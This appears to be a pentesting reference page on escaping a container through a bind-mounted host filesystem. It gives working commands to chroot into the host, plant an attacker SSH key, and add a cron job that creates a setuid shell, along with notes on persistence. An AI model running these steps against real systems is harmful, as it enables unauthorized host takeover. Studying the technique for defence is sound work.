---
title: "Host path mount: escaping through a bind-mounted host directory"
description: "Escaping a container to the host through a host filesystem path bound into the container, most powerfully the whole root filesystem, which gives direct read and write of host files and lets an attacker plant an SSH key, a cron job, or a setuid binary to execute on the host."
keywords:
  - host path mount
  - bind mount escape
  - docker volume escape
  - hostPath
  - container escape
---

# Host path mount

When a host directory is bind-mounted into a container, the container reads and writes that path on the host directly, with no namespace in the way. The strongest case is the whole root filesystem (`-v /:/host`), common in CI runners, backup sidecars, and "management" containers. Enumerate mounts first:

```bash
cat /proc/self/mountinfo        # look for host paths, especially / mounted read-write
mount | grep -vE 'proc|sysfs|tmpfs|cgroup'
```

With the host root mounted read-write, you own the host:

```bash
# Chroot into the host filesystem and act as root there
chroot /host sh

# Or without chroot, write host files directly
echo 'ssh-ed25519 AAAA... attacker' >> /host/root/.ssh/authorized_keys
echo '* * * * * root cp /bin/bash /tmp/b && chmod 4755 /tmp/b' > /host/etc/cron.d/x
```

Even a partial mount is useful: `/etc` lets you add a user or cron job, a mounted Docker or kubelet directory leaks credentials, and a mounted log directory can be a symlink primitive into the host. Read-only mounts still leak secrets (keys, tokens, configs) for use elsewhere.

## Exploitation notes

- A read-write host-root mount is immediate host takeover; prefer a cron job or SSH key over chroot if you need persistence rather than an interactive shell.
- In Kubernetes this is the `hostPath` volume; a pod that can mount `hostPath: /` reaches the node the same way, as the pod-delivery view in the Kubernetes area.
- A mounted `/var/run/docker.sock` is a special case covered under [Runtime socket mount](runtime-socket-mount.md).

## References

- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Kubernetes: hostPath volumes](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
